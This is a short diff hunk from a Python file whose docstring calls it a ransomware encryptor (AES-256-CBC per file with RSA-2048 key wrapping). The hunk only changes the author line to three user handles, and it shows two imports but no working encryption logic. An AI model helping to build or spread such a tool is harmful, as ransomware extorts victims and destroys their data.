@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """Ransomware encryptor -- AES-256-CBC per-file + RSA-2048 key wrapping.
 
-Author: zxwn
+Author: lingbol088-spec, MDX-Tom, FuDie0915
 """
 import os, hashlib
 from pathlib import Path
